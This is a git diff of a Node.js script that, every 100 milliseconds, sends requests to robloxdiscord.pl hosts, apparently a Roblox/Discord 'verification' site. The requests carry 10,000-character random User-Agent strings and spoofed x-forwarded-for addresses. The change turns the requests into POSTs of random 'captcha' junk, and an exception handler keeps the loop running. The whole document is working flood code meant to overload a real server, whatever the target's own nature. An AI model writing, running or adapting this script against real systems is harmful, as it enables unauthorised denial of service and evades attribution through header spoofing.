@@ -1,3 +1,5 @@
+
+
 import fetch from 'node-fetch'
 import fs from 'fs'
 process.on("uncaughtException", (err, origin) => {
@@ -17,7 +19,7 @@ function makeid(length) {
     return result;
     }
     setInterval(()=>{
-        fetch("https://api-bytow.robloxdiscord.pl/verificateddata.json", {
+        fetch("https://api-bytow.robloxdiscord.pl/agg", {
             "credentials": "omit",
             "headers": {
                 "User-Agent": makeid(10000),
@@ -30,8 +32,8 @@ function makeid(length) {
                 "x-forwarded-for": ["180.190.162.93", "79.186.224.82", "176.227.156.147", "177.125.95.106"]
             },
             "referrer": "https://weryfikacja-bytow.robloxdiscord.pl/",
-            "method": "GET",
+            "body": "captcha="+makeid(10000),
+            "method": "POST",
             "mode": "cors"
         })
     },100)
-
